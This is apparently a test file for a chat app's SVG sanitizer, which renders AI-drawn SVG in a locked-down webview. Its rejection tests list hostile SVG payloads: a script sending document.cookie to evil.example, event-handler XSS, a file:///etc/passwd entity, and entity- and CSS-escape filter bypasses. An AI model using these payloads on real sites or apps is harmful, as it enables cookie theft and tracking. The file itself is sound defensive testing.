// A picture an AI drew as SVG code is shown as a picture (#14), in a page
// that runs none of the SVG's code and reaches no address. An SVG that is
// more than a drawing stays code.

import { act, render, screen, userEvent } from '@testing-library/react-native';

import { setLang } from '@/i18n';
import { mockPhotoSave } from '@/test/photos';

import { Markdown } from './Markdown';
import { cleanSvg, drawableSvg, maxSvg, svgMessage, svgOf, svgPage } from './svg';
import { SvgBlock } from './SvgBlock';

const cat = [
  '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" width="200" height="200">',
  '  <!-- ears -->',
  '  <defs><linearGradient id="g"><stop offset="0" stop-color="#F4A261"/><stop offset="1" stop-color="#FFCDB2"/></linearGradient></defs>',
  '  <polygon points="42,78 50,28 92,60" fill="url(#g)"/>',
  '  <circle id="eye" cx="80" cy="105" r="8" fill="#2B2D42"/>',
  '  <use href="#eye" x="40"/>',
  '  <text x="100" y="180" text-anchor="middle" style="font: bold 14px sans-serif">고양이</text>',
  '</svg>',
].join('\n');

// The same picture as the app writes it again: no namespace address, no comment.
const drawn = [
  '<svg viewBox="0 0 200 200" width="200" height="200">',
  '  ',
  '  <defs><linearGradient id="g"><stop offset="0" stop-color="#F4A261"/><stop offset="1" stop-color="#FFCDB2"/></linearGradient></defs>',
  '  <polygon points="42,78 50,28 92,60" fill="url(#g)"/>',
  '  <circle id="eye" cx="80" cy="105" r="8" fill="#2B2D42"/>',
  '  <use href="#eye" x="40"/>',
  '  <text x="100" y="180" text-anchor="middle" style="font: bold 14px sans-serif">고양이</text>',
  '</svg>',
].join('\n');

const nonce = '0123456789abcdef0123456789abcdef';

afterEach(() => setLang('en'));

test('a drawing in an svg code block is taken, written again as a drawing only', () => {
  expect(svgOf('svg', cat)).toBe(drawn);
  expect(svgOf('SVG', `\n${cat}\n`)).toBe(drawn);
  expect(svgOf('xml', `<?xml version="1.0" encoding="UTF-8"?>\n<!-- a cat -->\n${cat}`)).toBe(drawn);
  expect(svgOf('html', cat)).toBe(drawn);
  expect(svgOf(undefined, cat)).toBe(drawn);
  expect(drawableSvg(cat)).toBe(true);
  // Written again, it reads the same.
  expect(cleanSvg(drawn)).toBe(drawn);
  // A small picture carried inside the SVG is part of the drawing.
  expect(drawableSvg('<svg><image href="data:image/png;base64,iVBORw0KGgo=" width="4" height="4"/></svg>')).toBe(true);
});

test('what is not part of a drawing is left out, and what is stays as written', () => {
  // Attributes the app does not know, a title, a description and editor notes go.
  expect(
    cleanSvg(
      '<svg data-x="1" role="img" aria-label="a" xmlns:xlink="http://www.w3.org/1999/xlink"><title>T <b>bold</b></title><desc>d</desc><metadata><x:y/></metadata><rect width="4" height="4" data-id="7"/></svg>',
    ),
  ).toBe('<svg><rect width="4" height="4"/></svg>');
  // Names are written as SVG spells them, whatever the case they came in.
  expect(cleanSvg('<SVG VIEWBOX="0 0 1 1"><LINEARGRADIENT ID="g"/></SVG>')).toBe('<svg viewBox="0 0 1 1"><linearGradient id="g"/></svg>');
  // Text and values are read once and written so that the browser reads the same.
  expect(cleanSvg('<svg><text font-family=\'"Noto Sans", sans-serif\'>A &amp; B &lt; C &#x41; &copy; &unknown; R&D</text></svg>')).toBe(
    '<svg><text font-family="&quot;Noto Sans&quot;, sans-serif">A &amp; B &lt; C A \u00a9 &amp;unknown; R&amp;D</text></svg>',
  );
  // A style sheet and an animation of a drawing stay.
  const moving =
    '<svg><style>.a { fill: red; stroke: url(#g) } @media (min-width: 10px) { .a > .b { opacity: .5 } }</style>' +
    '<circle class="a" r="5"><animate attributeName="r" values="5;8;5" dur="2s" repeatCount="indefinite"/></circle>' +
    '<g><animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="4s"/></g></svg>';
  expect(cleanSvg(moving)).toBe(moving.replace('.a > .b', '.a &gt; .b'));
  expect(cleanSvg('<svg><style><![CDATA[ .a { fill: #f00 } ]]></style></svg>')).toBe('<svg><style> .a { fill: #f00 } </style></svg>');
});

test('code that is not an SVG drawing stays code', () => {
  expect(svgOf('js', cat)).toBeNull();
  expect(svgOf('python', cat)).toBeNull();
  expect(svgOf('svg', 'not an svg')).toBeNull();
  expect(svgOf('svg', `Here it is:\n${cat}`)).toBeNull();
  expect(svgOf('svg', `${cat}\n<p>and more</p>`)).toBeNull();
  expect(svgOf('svg', '<svg><circle r="1"/>')).toBeNull();
  expect(svgOf('svg', `<svg>${' '.repeat(maxSvg)}</svg>`)).toBeNull();
});

test('an SVG that could run code or reach an address is not drawn', () => {
  const wrap = (inner: string, attrs = '') => `<svg xmlns="http://www.w3.org/2000/svg"${attrs}>${inner}</svg>`;
  const bad: Record<string, string> = {
    script: wrap('<script>fetch("https://evil.example/?" + document.cookie)</script>'),
    'script with space': wrap('< script >1</script>'),
    'a handler': wrap('<circle r="5" onclick="alert(1)"/>'),
    'a handler on the svg': wrap('<circle r="5"/>', ' onload="alert(1)"'),
    'a handler after a quote': wrap('<circle r="5" fill="red"onmouseover=alert(1) />'),
    'HTML inside': wrap('<foreignObject><div>hi</div></foreignObject>'),
    'a frame': wrap('<iframe src="https://example.com"></iframe>'),
    'an outside picture': wrap('<image href="https://tracker.example/pixel.png" width="1" height="1"/>'),
    'an outside picture, old attribute': wrap('<image xlink:href="http://tracker.example/p.png"/>'),
    'an outside picture, no quotes': wrap('<image href=https://tracker.example/p.png />'),
    'a protocol-relative address': wrap('<image href="//tracker.example/p.png"/>'),
    'a file on the phone': wrap('<image href="file:///data/user/0/app.askorus/files/secret"/>'),
    'a use from outside': wrap('<use href="https://example.com/sprite.svg#a"/>'),
    'a link': wrap('<a href="#x"><circle r="5"/></a>'),
    'a javascript address': wrap('<set attributeName="href" to="javascript:alert(1)"/>'),
    'CSS that loads': wrap('<style>circle { fill: url(https://example.com/p.svg#a) }</style><circle r="5"/>'),
    'CSS that loads, quoted': wrap('<circle r="5" style="fill: url(\'https://example.com/p\')"/>'),
    'a CSS import': wrap('<style>@import "https://example.com/x.css";</style>'),
    'a font from outside': wrap('<style>@font-face { font-family: x; src: url(//example.com/f.woff2) }</style>'),
    'an HTML page as data': wrap('<image href="data:text/html;base64,PHNjcmlwdD4="/>'),
    'an SVG as data (it could hold a script)': wrap('<image href="data:image/svg+xml;base64,PHN2Zz4="/>'),
    'an entity': '<!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg>&x;</svg>',
    'a stylesheet instruction': '<?xml-stylesheet href="https://example.com/x.css"?><svg></svg>',
    'a meta refresh': wrap('<meta http-equiv="refresh" content="0;url=https://example.com"/>'),
    // What a review got past the first filter (R-122).
    'a CSS address spelled with an entity': wrap('<circle style="fill:&#x75;rl(https://example.invalid/pixel)"/>'),
    'a CSS address spelled with an entity, decimal': wrap('<circle style="fill:&#117;rl(https://example.invalid/pixel)"/>'),
    'a CSS address spelled with a CSS escape': wrap('<circle style="fill:u\\72l(https://example.invalid/pixel)"/>'),
    'a CSS escape in a style sheet': wrap('<style>circle { fill: u\\72 l(x) }</style>'),
    'an animation that changes where a picture points': wrap('<image id="i" href="#x"/><set href="#i" attributeName="href" to="https://example.invalid/pixel"/>'),
    'an animation of the old attribute': wrap('<image id="i"/><animate href="#i" attributeName="xlink:href" values="#a;#b"/>'),
    'an animation that does not say what it changes': wrap('<image href="#x"><set to="https://example.invalid/pixel"/></image>'),
    'an animation to an address': wrap('<circle><set attributeName="fill" to="url(https://example.invalid/p)"/></circle>'),
    'HTML that leaves the SVG': wrap('<p><img srcset="https://example.invalid/pixel 1x"></p>'),
    'HTML in a title': wrap('<title><img src="https://example.invalid/pixel"></title>'),
    'an HTML picture': wrap('<img src="https://example.invalid/pixel"/>'),
    'a picture set in CSS': wrap('<circle style="background-image: image-set(\'https://example.invalid/p\' 1x)"/>'),
    'a picture set in CSS, old name': wrap('<style>rect { background: -webkit-image-set("x.png" 1x) }</style>'),
    'an address in any value': wrap('<circle fill="https://example.invalid/p"/>'),
    'a handler spelled with an entity': wrap('<circle on&#x63;lick="x()"/>'),
    'an attribute given twice': wrap('<image href="#a" HREF="https://example.invalid/p"/>'),
    'a value that is not closed': wrap('<circle fill="red/>'),
    'a tag that is not closed': '<svg><g><circle r="1"/></svg>',
    'a second picture after the first': '<svg></svg><svg><circle r="1"/></svg>',
    'text outside the picture': '<svg></svg>hello<svg></svg>',
    'an instruction inside': wrap('<?php echo 1 ?>'),
    'a character that is no character': wrap('<text>&#0;</text>'),
    'a control character': wrap('<text>a&#8;b</text>'),
    'nested too deep': `<svg>${'<g>'.repeat(70)}${'</g>'.repeat(70)}</svg>`,
    'too many elements': `<svg>${'<g/>'.repeat(4001)}</svg>`,
  };
  for (const [name, svg] of Object.entries(bad)) {
    expect([name, svgOf('svg', svg)]).toEqual([name, null]);
  }
});

test("the page allows no connection and only its own script, and holds no address of its own", () => {
  const page = svgPage(cat, nonce);
  // The page holds the picture as the app wrote it again, not the AI's text.
  expect(page).toContain(drawn);
  expect(page).not.toContain('<!-- ears -->');
  expect(() => svgPage('<svg><script>1</script></svg>', nonce)).toThrow();
  expect(page).toContain(`<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; img-src data:; script-src 'nonce-${nonce}'; base-uri 'none'; form-action 'none'">`);
  expect(page.match(/<script/g)).toHaveLength(1);
  expect(page).toContain(`<script nonce="${nonce}">`);
  // The whole page names one address: the namespace the PNG copy needs.
  expect(page.match(/https?:\/\/[^'"\s)]+/g)).toEqual(['http://www.w3.org/2000/svg']);
  expect(page).not.toMatch(/file:|src=/i);
  for (const bad of ['', 'abc', 'x"><script>', `${nonce}"`]) expect(() => svgPage(cat, bad)).toThrow();
});

test('what the page says is read strictly', () => {
  expect(svgMessage('{"height":212.4}')).toEqual({ height: 213 });
  expect(svgMessage('{"height":999999}')).toEqual({ height: 3000 });
  expect(svgMessage('{"height":0}')).toBeNull();
  expect(svgMessage('{"png":"data:image/png;base64,iVBORw0KGgo=","width":400,"height":300}')).toEqual({ png: 'iVBORw0KGgo=', width: 400, height: 300 });
  expect(svgMessage('{"png":"data:text/html;base64,PGI+","width":1,"height":1}')).toEqual({ pngError: true });
  expect(svgMessage('{"png":"data:image/png;base64,<script>","width":1,"height":1}')).toEqual({ pngError: true });
  expect(svgMessage('{"pngError":1}')).toEqual({ pngError: true });
  // A PNG is a PNG by its first bytes, and its size is a size (R-123).
  for (const junk of [
    '{"png":"data:image/png;base64,AAAAAAAAAAAA","width":4,"height":4}',
    '{"png":"data:image/png;base64,iVBORw0KGgo=","width":-1,"height":4}',
    '{"png":"data:image/png;base64,iVBORw0KGgo=","width":4,"height":1e999}',
    '{"png":"data:image/png;base64,iVBORw0KGgo=","width":4.5,"height":4}',
    '{"png":"data:image/png;base64,iVBORw0KGgo=","width":5000,"height":4}',
    '{"png":"data:image/png;base64,iVBORw0KGgo=","width":"4","height":4}',
    '{"png":"data:image/png;base64,iVBORw0KGgo=iVBOR","width":4,"height":4}',
  ]) {
    expect([junk, svgMessage(junk)]).toEqual([junk, { pngError: true }]);
  }
  for (const junk of ['', '212', 'null', '[]', '{"other":1}', 'not json', 5, null, undefined]) expect(svgMessage(junk)).toBeNull();
});

test('an svg block of an answer is drawn as a picture, with its code one press away', async () => {
  const user = userEvent.setup();
  await render(<Markdown text={['Here is the logo.', '', '```svg', cat, '```', '', 'Hope you like it.'].join('\n')} />);
  expect(screen.getByText('Here is the logo.')).toBeTruthy();
  const block = screen.getByTestId('svg-block');
  expect(block).toBeTruthy();
  const web = screen.getByTestId('svg-webview');
  expect(web.props.source.html).toContain(drawn);
  expect(web.props.source.html).toMatch(/default-src 'none'; style-src 'unsafe-inline'; img-src data:; script-src 'nonce-[0-9a-f]{32}'/);
  expect(web.props.source.baseUrl).toBe('about:blank');
  expect(web.props.allowFileAccess).toBe(false);
  // The page loads itself and nothing else.
  expect(web.props.onShouldStartLoadWithRequest({ url: 'about:blank' })).toBe(true);
  expect(web.props.onShouldStartLoadWithRequest({ url: 'https://example.com/' })).toBe(false);
  expect(screen.getByLabelText('A picture the AI drew as code')).toBeTruthy();
  // The code is not shown until asked for.
  expect(screen.queryByText(/<polygon points/)).toBeNull();
  await user.press(screen.getByRole('button', { name: 'Show code' }));
  expect(screen.getByText(/<polygon points/)).toBeTruthy();
  await user.press(screen.getByRole('button', { name: 'Hide code' }));
  expect(screen.queryByText(/<polygon points/)).toBeNull();
  // The page says how tall the picture is.
  await act(async () => web.props.onMessage({ nativeEvent: { data: '{"height":240}' } }));
  expect(screen.getByLabelText('A picture the AI drew as code').props.style).toEqual({ height: 240 });
});

test('an SVG that is more than a drawing, and other code, stay code blocks', async () => {
  const evil = '<svg xmlns="http://www.w3.org/2000/svg"><image href="https://tracker.example/p.png"/></svg>';
  await render(<Markdown text={['```svg', evil, '```', '', '```js', 'const svg = "<svg></svg>";', '```'].join('\n')} />);
  expect(screen.queryByTestId('svg-block')).toBeNull();
  expect(screen.queryByTestId('svg-webview')).toBeNull();
  expect(screen.getByText(evil)).toBeTruthy();
});

test('an answer gets six pictures; the SVG blocks after them are shown as code (R-123)', async () => {
  const one = (n: number) => ['```svg', `<svg><circle r="${n}"/></svg>`, '```', ''].join('\n');
  await render(<Markdown text={Array.from({ length: 9 }, (_, i) => one(i + 1)).join('\n')} />);
  expect(screen.getAllByTestId('svg-webview')).toHaveLength(6);
  expect(screen.queryByText('<svg><circle r="6"/></svg>')).toBeNull();
  for (const n of [7, 8, 9]) expect(screen.getByText(`<svg><circle r="${n}"/></svg>`)).toBeTruthy();
});

test('the page turns a picture into a PNG no larger than asked, however large the picture says it is (R-123)', () => {
  const page = svgPage('<svg style="max-width:none;width:8192px;height:8192px"><rect width="8192" height="8192"/></svg>', nonce);
  const script = page.slice(page.indexOf(`<script nonce="${nonce}">`) + `<script nonce="${nonce}">`.length, page.lastIndexOf('</script>'));
  // The page's own script, run with stand-ins for the page and the canvas.
  const run = (width: number, height: number, edge: number) => {
    const said: Record<string, unknown>[] = [];
    const canvases: { width: number; height: number }[] = [];
    const svg = {
      getBoundingClientRect: () => ({ width, height }),
      cloneNode: () => ({ setAttribute: () => undefined }),
    };
    const m = { scrollHeight: 10, getBoundingClientRect: () => ({ height: 10 }), querySelector: () => svg };
    const document = {
      getElementById: () => m,
      createElement: () => {
        const c = { width: 0, height: 0, getContext: () => ({ fillRect: () => undefined, drawImage: () => undefined }), toDataURL: () => 'data:image/png;base64,iVBORw0KGgo=' };
        canvases.push(c);
        return c;
      },
    };
    const window: Record<string, unknown> = { ReactNativeWebView: { postMessage: (x: string) => said.push(JSON.parse(x)) }, addEventListener: () => undefined };
    class FakeImage {
      onload: (() => void) | null = null;
      set src(_: string) {
        this.onload?.();
      }
    }
    class Serializer {
      serializeToString() {
        return '<svg/>';
      }
    }
    // eslint-disable-next-line @typescript-eslint/no-implied-eval, no-new-func
    new Function('window', 'document', 'Image', 'XMLSerializer', script)(window, document, FakeImage, Serializer);
    (window.askorusPng as (edge: number) => void)(edge);
    return { said: said.filter((x) => !('height' in x && !('png' in x))), canvases };
  };
  // A huge picture is drawn smaller, never larger than the edge asked for.
  expect(run(8192, 8192, 2048).canvases).toMatchObject([{ width: 2048, height: 2048 }]);
  expect(run(8000, 200, 2048).canvases).toMatchObject([{ width: 2048, height: 51 }]);
  // A small one is drawn up to four times its size.
  expect(run(200, 100, 2048).canvases).toMatchObject([{ width: 800, height: 400 }]);
  // The app cannot ask for more than 4096, and a picture beyond any size gets no canvas at all.
  expect(run(3000, 3000, 999999).canvases).toMatchObject([{ width: 4096, height: 4096 }]);
  for (const [w, h] of [[100000, 100], [0, 0], [Infinity, 10], [NaN, 10]]) {
    const r = run(w, h, 2048);
    expect([w, h, r.canvases.length, r.said]).toEqual([w, h, 0, [{ pngError: 1 }]]);
  }
});

test('a PNG the page sends without Save being pressed is not saved (R-123)', async () => {
  const user = userEvent.setup();
  await render(<SvgBlock svg={cat} source={cat} />);
  const web = screen.getByTestId('svg-webview');
  const png = '{"png":"data:image/png;base64,iVBORw0KGgo=","width":400,"height":400}';
  await act(async () => web.props.onMessage({ nativeEvent: { data: png } }));
  expect(mockPhotoSave.saved).toEqual([]);
  await user.press(screen.getByRole('button', { name: 'Save' }));
  await act(async () => web.props.onMessage({ nativeEvent: { data: png } }));
  // One press, one picture.
  await act(async () => web.props.onMessage({ nativeEvent: { data: png } }));
  expect(mockPhotoSave.saved).toEqual(['iVBORw0KGgo=']);
});

test("Save sends the page's PNG to the phone's photos and says so; a failure says so too", async () => {
  const user = userEvent.setup();
  await render(<SvgBlock svg={cat} source={cat} />);
  const web = screen.getByTestId('svg-webview');
  await user.press(screen.getByRole('button', { name: 'Save' }));
  // The page answers with the PNG it drew.
  await act(async () => web.props.onMessage({ nativeEvent: { data: '{"png":"data:image/png;base64,iVBORw0KGgo=","width":400,"height":400}' } }));
  expect(mockPhotoSave.saved).toEqual(['iVBORw0KGgo=']);
  expect(await screen.findByText("Saved to your phone's photos.")).toBeTruthy();

  mockPhotoSave.fail = 'unsupported';
  await user.press(screen.getByRole('button', { name: 'Save' }));
  await act(async () => web.props.onMessage({ nativeEvent: { data: '{"png":"data:image/png;base64,iVBORw0KGgo=","width":400,"height":400}' } }));
  expect(await screen.findByText("This phone can't save it. Android 10 and later can.")).toBeTruthy();

  mockPhotoSave.fail = null;
  await user.press(screen.getByRole('button', { name: 'Save' }));
  await act(async () => web.props.onMessage({ nativeEvent: { data: '{"pngError":1}' } }));
  expect(await screen.findByText("Couldn't save it.")).toBeTruthy();
  expect(mockPhotoSave.saved).toHaveLength(1);
});

test('a build that cannot save has no Save, and a page that fails shows the code', async () => {
  mockPhotoSave.available = false;
  await render(<SvgBlock svg={cat} source={cat} />);
  expect(screen.queryByRole('button', { name: 'Save' })).toBeNull();
  expect(screen.getByRole('button', { name: 'Show code' })).toBeTruthy();
  await act(async () => screen.getByTestId('svg-webview').props.onError());
  expect(screen.queryByTestId('svg-block')).toBeNull();
  expect(screen.getByText(/<polygon points/)).toBeTruthy();
});

test('the words are Korean in Korean', async () => {
  setLang('ko');
  await render(<SvgBlock svg={cat} source={cat} />);
  expect(screen.getByRole('button', { name: '코드 보기' })).toBeTruthy();
  expect(screen.getByRole('button', { name: '저장' })).toBeTruthy();
  expect(screen.getByLabelText('AI가 코드로 그린 그림')).toBeTruthy();
});
